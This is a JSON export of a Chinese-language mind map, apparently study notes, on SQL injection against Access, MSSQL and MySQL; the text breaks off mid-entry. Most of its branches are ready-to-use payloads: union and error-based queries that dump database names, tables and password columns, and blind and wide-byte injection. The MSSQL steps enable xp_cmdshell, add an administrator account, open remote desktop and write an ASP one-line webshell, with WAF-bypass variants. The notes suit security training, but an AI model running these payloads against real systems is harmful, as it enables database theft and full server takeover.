{"root":{"data":{"id":"d6ot7dnkjc00","created":1735538930009,"text":"SQL注入"},"children":[{"data":{"id":"d6otatqzymo0","created":1735539200138,"text":"注入原理与查找方法","layout_mind_offset":{"x":2.4999999627469833,"y":372.4999944493176},"expandState":"expand"},"children":[{"data":{"id":"d6otbkbbd740","created":1735539257962,"text":"注入攻击原理"},"children":[{"data":{"id":"d6otbx0a87k0","created":1735539285594,"text":"服务器在接受相关参数时未经处理直接带入数据\n库中进行查询"},"children":[]}]},{"data":{"id":"d6otbkq593k0","created":1735539258859,"text":"如何找注入"},"children":[{"data":{"id":"d6otc75h7r40","created":1735539307675,"text":"与数据库交互的相关页面","layout_right_offset":{"x":-75,"y":-2}},"children":[{"data":{"id":"d6otccr3x400","created":1735539319867,"text":"http://www.*****.com/***.asp?id=xx(ASP注\n入)"},"children":[]},{"data":{"id":"d6otd8bc6h40","created":1735539388571,"text":"http://www,*****.com/***.php?id=xx(php注\n入)"},"children":[]},{"data":{"id":"d6otd9q9ra80","created":1735539391650,"text":"http://www.*****.com/***,jsp?id=xx(jsp注入)"},"children":[]}]},{"data":{"id":"d6otc7f8wjc0","created":1735539308266,"text":"登录的地方、更新的地方、注册的地方、留言板"},"children":[]},{"data":{"id":"d6otc7nkutc0","created":1735539308770,"text":"可能出现注入的地方:http头、cookices、\nreferer、user agent，post提交数据包的地方等"},"children":[]}]}]},{"data":{"id":"d6otau5y7540","created":1735539201042,"text":"注入分类","layout_mind_offset":{"x":88.74999867752194,"y":397.4999940767884},"expandState":"expand"},"children":[{"data":{"id":"d6otejq70f40","created":1735539491778,"text":"数字型"},"children":[]},{"data":{"id":"d6otek0e1gg0","created":1735539492394,"text":"字符型"},"children":[]},{"data":{"id":"d6otek31dmw0","created":1735539492554,"text":"搜索型"},"children":[{"data":{"id":"d6otfb12u1s0","created":1735539551209,"text":"\"%vince%' or 1=1;"},"children":[]}]},{"data":{"id":"d6otezongl40","created":1735539526513,"text":"XX型"},"children":[{"data":{"id":"d6otfbvgq7c0","created":1735539553046,"text":"username=('xx') or 1=1;"},"children":[]}]}]},{"data":{"id":"d6otau95ew00","created":1735539201235,"text":"注入提交方式","layout_mind_offset":{"x":106.24999841675162,"y":498.749992568046},"expandState":"expand"},"children":[{"data":{"id":"d6otg2yzr8g0","created":1735539612033,"text":"get"},"children":[{"data":{"id":"d6otgetu62o0","created":1735539637842,"text":"地址栏可以看见参数"},"children":[]}]},{"data":{"id":"d6otg3bypcw0","created":1735539612817,"text":"post"},"children":[{"data":{"id":"d6otgg9121k0","created":1735539640938,"text":"通过burp抓包"},"children":[]}]},{"data":{"id":"d6otg3eqyjk0","created":1735539612985,"text":"cookie提交"},"children":[{"data":{"id":"d6otgmoa0yo0","created":1735539654921,"text":"通过burp抓包"},"children":[]}]}]},{"data":{"id":"d6otaubegcw0","created":1735539201371,"text":"注入攻击类型","layout_mind_offset":{"x":39.99999962747074,"y":585.9999923259024},"expandState":"expand"},"children":[{"data":{"id":"d6otigluenk0","created":1735539798441,"text":"union注入","layout_left_offset":{"x":-10,"y":-108},"expandState":"collapse"},"children":[{"data":{"id":"d6otinsevjc0","created":1735539814076,"text":"union操作符一般与order by语句配合使用","layout_left_offset":{"x":-6,"y":-1}},"children":[]}]},{"data":{"id":"d6otigw574w0","created":1735539799064,"text":"information_schema注入","expandState":"collapse","layout_left_offset":{"x":-19,"y":-102}},"children":[{"data":{"id":"d6otj7rowa00","created":1735539857568,"text":"information_schema数据库是MySQL系统自带\n的数据库。其中保存着关于MySQL服务器所维护\n的所有其他数据库的信息","layout_left_offset":{"x":-37,"y":-10}},"children":[]},{"data":{"id":"d6otj87u0o80","created":1735539858544,"text":"mysql的5.0版本以上支持","layout_left_offset":{"x":-84,"y":-15}},"children":[]},{"data":{"id":"d6otj8gfdbs0","created":1735539859063,"text":"注入流程","layout_left_offset":{"x":-48,"y":-53},"expandState":"expand"},"children":[{"data":{"id":"d6otjyoohgo0","created":1735539916159,"text":"and 1 =1或者and 1=2 或者 or 1=1 测试注\n入点","layout_left_offset":{"x":-41,"y":13}},"children":[{"data":{"id":"d6otk6om9z40","created":1735539933569,"text":"'and 1=1--"},"children":[]}]},{"data":{"id":"d6otjywr9co0","created":1735539916647,"text":"order by 数字 排序 判断有几个字段","layout_left_offset":{"x":-75,"y":5}},"children":[]},{"data":{"id":"d6otjyyzxco0","created":1735539916783,"text":"获取数据库的库名\n用 union select database() 字段数取第二步的\n值。例3个字段","layout_left_offset":{"x":-39,"y":-5}},"children":[{"data":{"id":"d6otkr0iooo0","created":1735539977824,"text":"and 1 = 2' union select database(),user(),0--","layout_left_offset":{"x":19,"y":-19}},"children":[]}]},{"data":{"id":"d6otle7dnsg0","created":1735540028305,"text":"获取表名\n用 union 查询 information_schema库的tables\n表的信息","layout_left_offset":{"x":-72,"y":-5}},"children":[{"data":{"id":"d6otlkly4t40","created":1735540042247,"text":"and 1 = 2' union select table_schema ,table_\nname,0 from information_schema.tables\nwhere table_schema='abc'--","layout_left_offset":{"x":17,"y":-1}},"children":[]}]},{"data":{"id":"d6otmhgs3a80","created":1735540113768,"text":"获取表的字段名 假设上一步查出有users表\n用 union 查询 information_schema库的\ncolumns表的信息","layout_left_offset":{"x":-110,"y":-1}},"children":[{"data":{"id":"d6otmi93hs00","created":1735540115480,"text":"and 1 = 2' union select table_name,column_\nname,0 from information_schema.columns\nwhere table_name='users'--","layout_left_offset":{"x":6,"y":-2}},"children":[]}]},{"data":{"id":"d6oto9lh7340","created":1735540253366,"text":"获取字段值 假设上-步查出password字段\n用 union select users表里 password字段的信\n总","layout_left_offset":{"x":-81,"y":-2}},"children":[{"data":{"id":"d6oto9tsu540","created":1735540253870,"text":"and 1 = 2' union select username,password,\n0 from users--","layout_left_offset":{"x":-6,"y":3}},"children":[]}]}]}]},{"data":{"id":"d6otigyo4x40","created":1735539799217,"text":"基于函数报错注入","layout_left_offset":{"x":-18.749998975545054,"y":-58.500000782311076},"expandState":"collapse"},"children":[{"data":{"id":"d6otqom759c0","created":1735540442790,"text":"updatexml() 原理是第二个参数需要Xpath格式\n的字符串\n我们传入的参数格式不符合要求 然后报错","layout_left_offset":{"x":-23,"y":-44},"expandState":"expand"},"children":[{"data":{"id":"d6otsxgxhuo0","created":1735540618791,"text":"具体爆信息步骤","layout_left_offset":{"x":-52,"y":2},"expandState":"expand"},"children":[{"data":{"id":"d6ott1e2og00","created":1735540627325,"text":"爆数据库版本信息\nk' and updatexml(1,concat(0x7e,(\nSELECT @@version),0x7e),1)#","layout_left_offset":{"x":-14,"y":-10}},"children":[]},{"data":{"id":"d6ott1u3chs0","created":1735540628294,"text":"爆数据库当前用户\nk' and updatexml(1,concat(0x7e,(SELECT\nuser()),0x7e),1)#","layout_left_offset":{"x":-5,"y":-11}},"children":[]},{"data":{"id":"d6ott25uqbk0","created":1735540629005,"text":"爆数据库\nk' and updatexml(1,concat(0x7e,(SELECT\ndatabase(),0x7e),1)#"},"children":[]},{"data":{"id":"d6ott2ecm3k0","created":1735540629519,"text":"爆表\n获取数据库表名，输入:k'and updatexml(1,\nconcat(0x7e,(select table_name from\ninformation_schema.tables where table_\nschema='abc'limit 0,1),0x7e),0)#"},"children":[]},{"data":{"id":"d6otvvqcqg00","created":1735540850100,"text":"、爆字段\n获取字段名，输入:k'and updatexml(1,\nconcat(0x7e,(select column_name from\ninformation_schema.columns where table_\nname='users'limit 2,1),0x7e),0)#","expandState":"expand"},"children":[]},{"data":{"id":"d6otx44vzd40","created":1735540946757,"text":"爆字段内容\n获取字段内容，输入:k'and updatexml(1,\nconcat(0x7e,(select password from users\nlimit 0,1), 0x7e),0)#","layout_left_offset":{"x":-1,"y":-7}},"children":[]}]},{"data":{"id":"d6otsxtvimw0","created":1735540619574,"text":"insert","expandState":"expand","layout_left_offset":{"x":-60,"y":-12}},"children":[{"data":{"id":"d6otxmiu3t40","created":1735540986782,"text":" 爆表名\n'or updatexml(1,concat(0x7e,(select table_\nname from information_schema.tables\nwhere table_schema='pikachu' limit 0,1)),0)\nor'","layout_left_offset":{"x":-62,"y":-14}},"children":[]},{"data":{"id":"d6otxqqa5c80","created":1735540995940,"text":"爆列名\n'or updatexml(1,concat(0x7e,(select column_\nname from information_schema.columns\nwhere table_name='users' limit 2,1)),0) or'","layout_left_offset":{"x":-55,"y":-19}},"children":[]},{"data":{"id":"d6otxqv6hi80","created":1735540996236,"text":"爆内容\n'or updatexml(1,concat(0x7e,(SELECT\ndatabase()),0x7e),1)or'","layout_left_offset":{"x":-101,"y":-26}},"children":[]},{"data":{"id":"d6otzx1l8y80","created":1735541166412,"text":"测试 oldboy'or updatexml(1,concat(0x7e,(命\n令)),0) or'","layout_left_offset":{"x":-73,"y":-34}},"children":[]}]},{"data":{"id":"d6otsyqyp9c0","created":1735540621574,"text":"update","layout_left_offset":{"x":-116,"y":-58}},"children":[{"data":{"id":"d6ou1crdkoo0","created":1735541278988,"text":"与insert相同"},"children":[]}]},{"data":{"id":"d6ou0seisy00","created":1735541234675,"text":"delete","layout_left_offset":{"x":-105,"y":-68}},"children":[{"data":{"id":"d6ou0wckbjs0","created":1735541243263,"text":"delete from message where id=56 or\nupdatexml(2,concat(0x7e,(database())),0)","layout_left_offset":{"x":-24,"y":2}},"children":[]}]}]},{"data":{"id":"d6otqpetozk0","created":1735540444521,"text":"extractvalue()","layout_left_offset":{"x":-11.750000316649789,"y":-205.7500006146729}},"children":[{"data":{"id":"d6ou2ppoi0g0","created":1735541385547,"text":"xx' and extractvalue(0,concat(0x7e,\nversion()))#","layout_left_offset":{"x":-24.99999962747097,"y":38.74999942258006}},"children":[]}]},{"data":{"id":"d6ou2o2ee3s0","created":1735541381963,"text":"floor():MYSQL中用来取整的函数,","layout_left_offset":{"x":-38.749999422580004,"y":-133.7499980069698}},"children":[]}]},{"data":{"id":"d6ou3e2ulrs0","created":1735541438586,"text":"Cookie注入","layout_left_offset":{"x":-18.749999720602887,"y":-51.24999916180991},"expandState":"expand"},"children":[{"data":{"id":"d6ou4fzzn8g0","created":1735541521131,"text":"把http header直接代入数据库"},"children":[]}]},{"data":{"id":"d6ou4ebsr6w0","created":1735541517492,"text":"Cookie注入","layout_left_offset":{"x":-34.999999478459245,"y":-42.49999936670076},"expandState":"expand"},"children":[{"data":{"id":"d6ou4f1ko1c0","created":1735541519050,"text":"数据参数写入到cookie参数里面","layout_left_offset":{"x":-6.249999906867629,"y":-4.999999925494308}},"children":[]}]},{"data":{"id":"d6ou5z6s7vs0","created":1735541641265,"text":"盲注","layout_left_offset":{"x":-38.749999422580004,"y":-26.249999608844576},"expandState":"expand"},"children":[{"data":{"id":"d6ou62a6xg80","created":1735541648001,"text":"基于布尔型SQL盲注"},"children":[{"data":{"id":"d6ou73n6cns0","created":1735541729328,"text":"select ascii(substr(database(),1,1))>x;","layout_left_offset":{"x":19.999999701976776,"y":6.2499999068677425}},"children":[{"data":{"id":"d6ou8do95uo0","created":1735541829525,"text":"vince' and ascii(substr(database(),1,1))=\n112#，得到后台数据库的名称的第一个字符的\nascii码。","layout_left_offset":{"x":17.499999739229565,"y":-16.249999757856187}},"children":[]}]}]},{"data":{"id":"d6ou6k8s3280","created":1735541687098,"text":"基于时间型SQL盲注","layout_left_offset":{"x":-2.499999962747097,"y":-1.2499999813735485}},"children":[{"data":{"id":"d6ou7igtag00","created":1735541761595,"text":"vince' and sleep(x)#"},"children":[]}]},{"data":{"id":"d6ou72lcqsg0","created":1735541727041,"text":"基于报错型SQL盲注"},"children":[{"data":{"id":"d6ou7lewdeo0","created":1735541768009,"text":"updatexml()"},"children":[]}]}]},{"data":{"id":"d6ou5zktbh40","created":1735541642113,"text":"宽字节注入","layout_left_offset":{"x":-37.49999944120634,"y":-13.749999795108977}},"children":[{"data":{"id":"d6ou687puu80","created":1735541660914,"text":"跟GBK有关，%df' or1=1#"},"children":[]}]}]},{"data":{"id":"d6otaudw48w0","created":1735539201522,"text":"access数据库","layout_mind_offset":{"x":-1356.249978300184,"y":143.49999623745657},"expandState":"expand"},"children":[{"data":{"id":"d6oua8zlkhc0","created":1735541976055,"text":"判断是否是accseee库的关键信息"},"children":[{"data":{"id":"d6ouarmsy5k0","created":1735542016640,"text":"参数后面加'，看返回信息\nMicrosoft OLE DB Provider for ODBC Drivers\n错误'80040e21'\nODBC 驱动程序不支持所需的属性。","layout_left_offset":{"x":-4.999999925494308,"y":-28.74999957159156}},"children":[]}]},{"data":{"id":"d6oua9b8gl40","created":1735541976759,"text":"猜解数据库表名","layout_left_offset":{"x":-3.749999944120759,"y":-2.4999999627469833}},"children":[{"data":{"id":"d6ouazv5r880","created":1735542034560,"text":"and exists(select * from users)","layout_left_offset":{"x":17.49999973922968,"y":-2.499999962747097}},"children":[]}]},{"data":{"id":"d6oua9fhog80","created":1735541977016,"text":"猜解数据库表名里面的字段","layout_left_offset":{"x":-8.749999869614726,"y":-6.2499999068677425}},"children":[{"data":{"id":"d6oubb22vbc0","created":1735542058923,"text":"and exists(select password from\nadministrator)","layout_left_offset":{"x":-41.2499993853271,"y":-7.499999888241177}},"children":[]}]},{"data":{"id":"d6oua9mreow0","created":1735541977456,"text":"猜解字段内容","layout_left_offset":{"x":-8.74999986961484,"y":-2.499999962747097}},"children":[{"data":{"id":"d6oubq86i5c0","created":1735542091943,"text":"and (select top 1 len(user_name) from\nadministrator)>1","layout_left_offset":{"x":-32.49999951571232,"y":-14.999999776482582}},"children":[]},{"data":{"id":"d6oubqiauag0","created":1735542092555,"text":"and (select top 1 asc(mid(user_name,1,1))\nfrom administrator)>0","layout_left_offset":{"x":-28.749999571591673,"y":-19.99999970197689}},"children":[]}]},{"data":{"id":"d6ouce1nl540","created":1735542143792,"text":"SQL注入中的高级查询","layout_left_offset":{"x":-21.249999683350325,"y":-39.999999403953666}},"children":[{"data":{"id":"d6oucelhoyo0","created":1735542144991,"text":"order by"},"children":[]},{"data":{"id":"d6oucesxryw0","created":1735542145441,"text":"union select","layout_left_offset":{"x":11.249999832361937,"y":-8.74999986961484}},"children":[]}]},{"data":{"id":"d6oucvd7ov40","created":1735542181496,"text":"偏移注入","layout_left_offset":{"x":-22.499999664723987,"y":-61.24999908730388}},"children":[]},{"data":{"id":"d6oud4uacuw0","created":1735542202119,"text":"跨库查询","layout_left_offset":{"x":-16.249999757856017,"y":-59.999999105930215}},"children":[{"data":{"id":"d6ouda581ts0","created":1735542213664,"text":"同一服务器不同的站点，A站点没有发现注入\n点，B站点发现了注入点。找出数据库物理路径\n之后，通过union select 方式查询","layout_left_offset":{"x":-14.999999776482468,"y":-31.249999534338713}},"children":[]}]}]},{"data":{"id":"d6otavm5oxk0","created":1735539204198,"text":"Mssql数据库","layout_mind_offset":{"x":1712.9999764561644,"y":1181.2499835900967},"expandState":"expand"},"children":[{"data":{"id":"d6oufbngaw80","created":1735542373672,"text":"拿服务器权限"},"children":[{"data":{"id":"d6oufospce00","created":1735542402287,"text":"sa用户  直接执行命令","expandState":"expand"},"children":[{"data":{"id":"d6ouk8w6vc00","created":1735542759491,"text":"账户名  root"},"children":[]},{"data":{"id":"d6ouk94evk80","created":1735542759988,"text":"第一步:检查是否是mssql数据库"},"children":[{"data":{"id":"d6oukn4clbc0","created":1735542790459,"text":"and exists (select *from%20sysobjects)","layout_left_offset":{"x":14.999999776482582,"y":0}},"children":[]}]},{"data":{"id":"d6ouk96eg8o0","created":1735542760108,"text":"第二步:查询当前数据库系统的用户名"},"children":[{"data":{"id":"d6oul5gvmyg0","created":1735542830399,"text":"and system user=0\n不显示用户名信息的话换低版本浏览器","layout_left_offset":{"x":6.249999906867856,"y":-4.999999925494194}},"children":[]}]},{"data":{"id":"d6ouk98jc7c0","created":1735542760237,"text":"第三步:检查注入点是否为sa权限"},"children":[{"data":{"id":"d6oulhjhblc0","created":1735542856677,"text":"and 1=(select IS_SRVROLEMEMBER(\"\nsysadmin'))","layout_left_offset":{"x":-4.999999925494308,"y":-3.7499999441206455}},"children":[]}]},{"data":{"id":"d6ouk9apjw00","created":1735542760369,"text":"第四步:判断-下xp cmdshel存储过程是否存\n在","layout_left_offset":{"x":14.999999776482468,"y":11.249999832361937}},"children":[{"data":{"id":"d6ouluqqk140","created":1735542885414,"text":"and 1=(select count(*) from master.dbo.\nsysobjects where name ='xp_cmdshell')","layout_left_offset":{"x":4.99999992549408,"y":-18.749999720603228}},"children":[]},{"data":{"id":"d6ouluxeb4o0","created":1735542885817,"text":"恢复xp_cmdshell可以用 EXEC sp_configure'\nshow advanced options', 1;RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1;\nRECONFIGURE;--","layout_left_offset":{"x":-11.24999983236205,"y":-13.749999795109204}},"children":[]}]},{"data":{"id":"d6ounlniqqg0","created":1735543022357,"text":"第五步:添加帐号","layout_left_offset":{"x":-34.99999947845947,"y":-7.499999888241405}},"children":[{"data":{"id":"d6ounnxjfrs0","created":1735543027316,"text":"exec master..xp_cmdshell 'net user test test /\nadd'","layout_left_offset":{"x":-63.749999050050974,"y":-2.499999962747097}},"children":[]},{"data":{"id":"d6ouo33kso00","created":1735543060333,"text":";exec master..xp_cmdshell 'net localgroup\nadministrators test /add'","layout_left_offset":{"x":-77.49999884516001,"y":-4.999999925494308}},"children":[]}]},{"data":{"id":"d6ounlr2wiw0","created":1735543022572,"text":"第六步:开启3389","layout_left_offset":{"x":-18.749999720603228,"y":-13.749999795109034}},"children":[{"data":{"id":"d6ouoq8jz940","created":1735543110700,"text":";exec master.dbo.xp_regwrite'HKEY_LOCAL\n_MACHINE','SYSTEM\\CurrentControlSet\\\nControl\\Terminal Server','\nfDenyTSConnections','REG_DWORD',0;","layout_left_offset":{"x":-68.74999897554528,"y":-8.749999869614953}},"children":[]}]}]},{"data":{"id":"d6ougbqexu00","created":1735542452215,"text":"dbowner用户  差异备份","layout_left_offset":{"x":-63.749999050050974,"y":2.49999996274704},"expandState":"expand"},"children":[{"data":{"id":"d6ouq5xfc1c0","created":1735543223220,"text":"第一步:查看当前网站是否为db_owner权限"},"children":[{"data":{"id":"d6ouqljgkso0","created":1735543257204,"text":"and 1=(SELECT IS_MEMBER('db_\nowner')):--","layout_left_offset":{"x":22.499999664723873,"y":-7.499999888241291}},"children":[{"data":{"id":"d6ouqvlyagw0","created":1735543279123,"text":"判断当前数据库用户是否为db_owner权限","layout_left_offset":{"x":24.99999962747097,"y":2.499999962747097}},"children":[]}]}]},{"data":{"id":"d6ouq6byrm00","created":1735543224099,"text":"第二步:找出网站路径"},"children":[{"data":{"id":"d6ourdjlnz40","created":1735543318162,"text":"1、通过加单引号报错法 ，看看报错是否显示物\n理路径或baidu、google等查找","layout_left_offset":{"x":6.249999906867629,"y":-1.2499999813735485}},"children":[]},{"data":{"id":"d6ourdrc48w0","created":1735543318630,"text":"2，通过相关语句","layout_left_offset":{"x":-3.749999944120759,"y":23.74999964609742}},"children":[{"data":{"id":"d6ourutpmjs0","created":1735543355779,"text":"drop table black;create Table black(result\nvarchar(7996) null, id int not null identity (1,\n1))--","layout_left_offset":{"x":-8.74999986961484,"y":-26.24999960884452}},"children":[]},{"data":{"id":"d6ourv0bxzk0","created":1735543356179,"text":"insert into black exec master..xp cmdshell '\ndir /s c:\\1.aspx'--","layout_left_offset":{"x":-17.49999973922968,"y":-27.499999590217953}},"children":[]},{"data":{"id":"d6ousg782vk0","created":1735543402309,"text":"and (select result from black where id=1)>\n0-","layout_left_offset":{"x":-9.999999850988388,"y":-23.749999646097365}},"children":[]}]}]},{"data":{"id":"d6ouq76nlpc0","created":1735543225955,"text":"第三步:写入一句话木马获取webshell","layout_left_offset":{"x":2.4999999627469833,"y":14.999999776482582}},"children":[{"data":{"id":"d6ovbqfce200","created":1735544913486,"text":"1；master..xp_cmd"},"children":[{"data":{"id":"d6ovcggtxfk0","created":1735544970173,"text":"%20;exec%20master..xp_cmdshell%20'\nEcho%20\"<%eval%20request(\"\nchopper\")%>\"%20>>%20c:\\wwwtest\\iis-\nxxser.com--wwwroot\\sqlservermuma.asp'--","layout_left_offset":{"x":-8.74999986961484,"y":-18.749999720603284}},"children":[]}]},{"data":{"id":"d6ovbqljrhc0","created":1735544913862,"text":"差异备份","expandState":"expand"},"children":[{"data":{"id":"d6ovcvilpx40","created":1735545002932,"text":"工具GetWebShell 条件","layout_left_offset":{"x":-42.49999936670088,"y":-38.749999422580004}},"children":[{"data":{"id":"d6ovd2l6fog0","created":1735545018325,"text":"注入点"},"children":[]},{"data":{"id":"d6ovd2rs0g80","created":1735545018724,"text":"一句话木马"},"children":[]},{"data":{"id":"d6ovd2ukimg0","created":1735545018893,"text":"网站绝对路径"},"children":[]}]},{"data":{"id":"d6ovcvpc3l40","created":1735545003339,"text":"2、手工\n;alter database testdb set RECOVERY FULL:\ncreate table test tmp(str image);backup log\ntestdb to disk='c:\\test1' with init;insert into\ntest tmp(str) values(\n0x3C25657863757465287265717565737428\n22636D64222929253E);backup log testdb to\ndisk='C:\\wwwtest\\iis-xxser.com--wwwroot\\\nyjh.asp';alter database testdb set RECOVERY\nsimple","layout_left_offset":{"x":-121.24999819323398,"y":-57.49999914318323}},"children":[]},{"data":{"id":"d6overxzcx40","created":1735545151883,"text":"思路：先备份数据库源文件，然后插入一句话木马，再做差异备份，新文件后缀名为asp","layout_left_offset":{"x":-36.24999945983291,"y":-57.49999914318306}},"children":[]}]}]}]},{"data":{"id":"d6oufp1jjmo0","created":1735542402822,"text":"public用户脱库","layout_left_offset":{"x":-47.4999992921945,"y":21.249999683350325},"expandState":"expand"},"children":[{"data":{"id":"d6ovg46wvps0","created":1735545256908,"text":"第一步:获取当前网站数据库名称"},"children":[{"data":{"id":"d6ovgkww6qo0","created":1735545293308,"text":"and db_name0=0--","expandState":"expand"},"children":[]}]},{"data":{"id":"d6ovg4io8rk0","created":1735545257619,"text":"第二步:获取mssql所有数据库名和路径"},"children":[{"data":{"id":"d6ovh0q7rao0","created":1735545327732,"text":"%20and%200=(select%20top%202%20cast([\nname]%20as%20nvarchar(256))%2bchar(\n94)%2bcast([filename]%20as%20nvarchar(\n256))%20from%20(select%20top%202%\n20dbid,name,filename%20from%20[\nmaster].[dbo].[sysdatabases]%20order%\n20by%20[dbid])%20t%20order%20by%20[\ndbid]%20desc)--","layout_left_offset":{"x":-118.74999823048722,"y":-61.24999908730388}},"children":[]}]},{"data":{"id":"d6ovg4nyv4w0","created":1735545257940,"text":"第三步:获取当前数据库所有表名","layout_left_offset":{"x":-91.24999864026893,"y":-33.74999949708581}},"children":[{"data":{"id":"d6ovhf6b2xk0","created":1735545359180,"text":"and 0<>(select top 1 name from testdb.dbo.\nsysobjects where xtype=0x7500 and name\nnot in (select top 2 name from testdb.dbo.\nsysobjects where xtype=0x7500))--\nhaving 1=1--","layout_left_offset":{"x":-71.24999893829226,"y":-41.2499993853271}},"children":[]}]},{"data":{"id":"d6ovg4tnntc0","created":1735545258284,"text":"第四步:爆表名及字段名","layout_left_offset":{"x":-68.7499989755454,"y":-88.74999867752194}},"children":[{"data":{"id":"d6ovhmuu3lc0","created":1735545375901,"text":"having 1=1--","layout_left_offset":{"x":-32.49999951571226,"y":3.7499999441206455}},"children":[]},{"data":{"id":"d6ovhn196e80","created":1735545376289,"text":"group by admin.id having 1=1--"},"children":[]},{"data":{"id":"d6ovhn3f5480","created":1735545376420,"text":"group by admin.id,admin.name having 1=\n--","layout_left_offset":{"x":14.999999776482582,"y":3.749999944120759}},"children":[]}]},{"data":{"id":"d6ovit1iz8w0","created":1735545467731,"text":"第五步:获取字段内容","layout_left_offset":{"x":-109.99999836087238,"y":-133.7499980069697}},"children":[{"data":{"id":"d6oviv02jog0","created":1735545471996,"text":"/**/and/**/(select/**/top/**/1/**/isnull(cast([\nid]/**/as/**/nvarchar(4000)),char(32))%\n2bchar(94)%2bisnull(cast([name]/**/as/**/\nnvarchar(4000)),char(32))%2bchar(94)%\n2bisnull(cast([password]/**/as/**/nvarchar(\n4000)),char(32))/**/from/**/[testdb]..[\nadmin]/**/where/**/1=1/**/and/**/id/**\nnot/**/in/**/(select/**/top/**/0/**/id/**/\nfrom/**/[testdb]..[admin]/**/where/**/1=\n1/**/group/**/by/**/id))%3E0/**/and/**/1=1","layout_left_offset":{"x":-249.99999627470982,"y":-124.99999813735508}},"children":[{"data":{"id":"d6oviv3zkns0","created":1735545472233,"text":"字符串变型，绕过waf","layout_left_offset":{"x":-2.499999962747097,"y":68.74999897554505}},"children":[]}]}]}]}]},{"data":{"id":"d6oufc3e4480","created":1735542374636,"text":"注释 ：--    /**/","layout_left_offset":{"x":-54.999999180436134,"y":11.249999832361937}},"children":[]},{"data":{"id":"d6oui5zboko0","created":1735542596421,"text":"工具"},"children":[{"data":{"id":"d6ouiabu9dc0","created":1735542605885,"text":"穿山甲Pangolin"},"children":[]},{"data":{"id":"d6ouiahjqqg0","created":1735542606230,"text":"Havij","layout_left_offset":{"x":-24.99999962747097,"y":-9.999999850988331}},"children":[]}]}]},{"data":{"id":"d6ovjt7a0og0","created":1735545546442,"text":"MySQL数据库","layout_mind_offset":{"x":-66.24999901279836,"y":-919.9999862909318},"expandState":"expand"},"children":[{"data":{"id":"d6ovkn0xa8w0","created":1735545611362,"text":"mysql4与5区别","expandState":"expand","layout_left_offset":{"x":4.999999925493967,"y":-46.249999310821124}},"children":[{"data":{"id":"d6ovlueipao0","created":1735545705785,"text":"4版本数据库只能采用类似Access的方法进行查\n询猜解。\n首先，利用order by获得当前表的字段数，再使\n用union select联合查询来获取想要的数据库信息。","layout_left_offset":{"x":-64.99999903142464,"y":-79.99999880790722}},"children":[]},{"data":{"id":"d6ovmjmamog0","created":1735545760675,"text":"5版本由于information schema库的存在，注入\n攻击相对方便\nload_file函数读取文件\n通过dumpfile/outfile函数导出获取WebShell.","layout_left_offset":{"x":-79.99999880790716,"y":-71.24999893829204}},"children":[]}]},{"data":{"id":"d6ovkn9pvfk0","created":1735545611893,"text":"mysql用户名密码存储位置","layout_left_offset":{"x":-21.24999968335044,"y":-68.74999897554517},"expandState":"expand"},"children":[{"data":{"id":"d6ovmzx3qvc0","created":1735545796157,"text":"数据库最高权限用户是root 密码保存在mysql数\n据库的user表中，密码是采用mysq15特有的加\n对数据库做安全的时候不能给网站root 权限，给\n普通用户权限。","layout_left_offset":{"x":-1.1368683772161603e-13,"y":-19.99999970197672}},"children":[]}]},{"data":{"id":"d6ovkncqzsg0","created":1735545612077,"text":"MySQL注入语句","layout_left_offset":{"x":-34.99999947845947,"y":-36.24999945983268},"expandState":"expand"},"children":[{"data":{"id":"d6ovniks61s0","created":1735545836771,"text":"检查注入点’与and 1=1 and 1=2","layout_left_offset":{"x":-66.24999901279807,"y":-33.74999949708558}},"children":[]},{"data":{"id":"d6ovniu8qy00","created":1735545837343,"text":"order by 1,2--+&Submit=Submit#","layout_left_offset":{"x":-79.99999880790722,"y":-32.499999515712375}},"children":[]},{"data":{"id":"d6ovniwpfbk0","created":1735545837492,"text":"union select user(),version()--+&Submit=\nSubmit#\n查看数据库用户名和版本、库名(\ndvwa)","layout_left_offset":{"x":-351.24999476596713,"y":-141.2499978952112}},"children":[]},{"data":{"id":"d6ovnj0le8w0","created":1735545837727,"text":"union select 1,group concat(schema name)\nfrom information schema.schemata+--+&\nSubmit=Submit 获取mysql所有库","layout_left_offset":{"x":-342.4999948963524,"y":-108.74999837949878}},"children":[]},{"data":{"id":"d6ovnj2m3i00","created":1735545837849,"text":"union select 1,group concat(table name)\nfrom information schema.tables where\ntable schema=database(+--+&Submit=\nSubmit 获取dwva表名\nguestbook,users","layout_left_offset":{"x":-336.24999498948466,"y":-114.9999982863664}},"children":[]},{"data":{"id":"d6ovnjhydyw0","created":1735545838777,"text":"union select 1,group concat(column name)\nfrom information schema.columns where\ntable name=0x7573657273+--+&Submit=\nSubmit 获取所有user表里面的字段\ntable name=0x7573657273 不转成十六进制\n也可以table_name=\"users\"","layout_left_offset":{"x":-652.4999902769924,"y":-204.99999694526196}},"children":[]},{"data":{"id":"d6ovppzmj940","created":1735546009634,"text":"union select 1,group concat(user id,0x7c,\nfirst name,0x7c,last name,0x7c,user,Ox7c,\npassword,0x7c,avatar0x7c)from users+ --+&\nSubmit=Submit 获取所有字股内容","layout_left_offset":{"x":-642.499990426004,"y":-204.99999694526207}},"children":[]},{"data":{"id":"d6ovpq6qo200","created":1735546010065,"text":"对服务器文件进行读写操作(前提条件)","layout_left_offset":{"x":-38.749999422579776,"y":-41.249999385327044},"expandState":"expand"},"children":[{"data":{"id":"d6ovr4txbrk0","created":1735546120306,"text":"需要知道物理目录"},"children":[]},{"data":{"id":"d6ovr50b97k0","created":1735546120692,"text":"需要远程目录有写权限"},"children":[]},{"data":{"id":"d6ovr52th200","created":1735546120843,"text":"上传目录是否有脚本执行权限"},"children":[]},{"data":{"id":"d6ovrh3yf3c0","created":1735546147033,"text":"需要mysql root权限"},"children":[]},{"data":{"id":"d6ovrh62cg00","created":1735546147161,"text":"需要数据库开启secure file priv 相当于secure\nfile priv的值为空，不为空允许写入webshell (\n默认不开启，需要修改my.ini配置文件)","layout_left_offset":{"x":-6.249999906867629,"y":-6.2499999068677425}},"children":[]}]},{"data":{"id":"d6ovs2bq23s0","created":1735546193216,"text":"web获取路径的方法","layout_left_offset":{"x":-171.24999744817637,"y":-191.24999715015292}},"children":[{"data":{"id":"d6ovt0c6m4o0","created":1735546267254,"text":"%27%20union%20select%201,load 